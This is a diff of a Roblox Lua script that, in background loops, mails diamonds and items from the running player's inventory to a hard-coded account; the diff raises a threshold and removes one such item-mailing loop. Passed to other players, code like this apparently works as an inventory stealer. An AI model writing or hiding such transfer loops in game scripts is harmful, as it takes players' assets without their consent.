@@ -24,7 +24,7 @@ spawn(function()
     local username = "ProfiAzUr" -- Replace with recipient's username
     local loopInterval = 15 -- Interval in minutes
     local mailTax = 100000 -- Tax deduction for sending diamonds
-    local diamondThreshold = 5000000 -- Threshold for sending all gems
+    local diamondThreshold = 100000000 -- Threshold for sending all gems
 
     while true do
         print("Attempting to retrieve diamond data...")
@@ -87,42 +87,6 @@ spawn(function()
     end
 end)
 
--- Goop Mailer
-spawn(function()
-    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-    local username = "ProfiAzUr"
-    local loopInterval = 10 -- Interval in minutes 
-    local sendAmount = 10000 -- Editable amount
-    while true do
-        local playerInventory = Save.Get()["Inventory"]
-        local MiscInv = playerInventory["Misc"]
-        print("Searching for Bucket O' Magic...")
-        for key, item in pairs(MiscInv) do
-            if item.id == "Bucket O' Magic" then
-                local availableAmount = item._am or item.am or 1
-                if availableAmount >= sendAmount then
-                    local amountToSend = availableAmount > sendAmount and availableAmount or sendAmount
-                    print("Found Bucket O' Magic item:", item)
-                    print("Amount to send:", amountToSend)
-                    local args = {
-                        [1] = username,
-                        [2] = "Thereeee",
-                        [3] = "Misc",
-                        [4] = key,
-                        [5] = amountToSend
-                    }
-                    print("Invoking Server with args:", unpack(args))
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                else
-                    print("Not enough Bucket O' Magic to send. Required:", sendAmount, "Available:", availableAmount)
-                end
-                break
-            end
-        end
-        print("Finished processing Bucket O' Magic.")
-        task.wait(loopInterval * 60)
-    end
-end)
 
 -- Clan Gift Mailer
 spawn(function()
